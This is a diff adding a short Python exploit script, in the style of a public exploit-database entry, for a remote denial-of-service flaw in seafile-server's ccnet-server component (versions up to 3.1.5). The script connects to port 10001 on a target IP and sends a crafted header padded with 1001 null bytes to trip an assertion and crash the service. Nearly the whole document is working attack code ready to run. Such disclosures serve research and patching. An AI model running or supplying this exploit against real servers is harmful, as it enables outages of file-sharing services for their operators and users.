@@ -1,0 +1,27 @@
+# Exploit Title: ccnet-server remote DoS (assert) seafile-server <= 3.1.5 
+# Date: Sep 4, 2014
+# Exploit Author: retset
+# Vendor Homepage: seafile.com
+# Software Link: https://bitbucket.org/haiwen/seafile/downloads/seafile-server_3.1.4_win32.tar.gz
+# Version: seafile-server 3.1.4
+# Tested on: Windows 7/seafile-server 3.1.5
+
+import socket
+import sys
+
+
+ip = sys.argv[1]
+addr = (ip, 10001)
+s = socket.create_connection(addr)
+
+dos = '\x00\x04\x00\x00\x00\x00\x03\xe8'
+dos += '\x00' * 1001 
+
+s.send(dos)
+print repr(s.recv(1024))
+
+
+s.close()
+
+
+#@retset
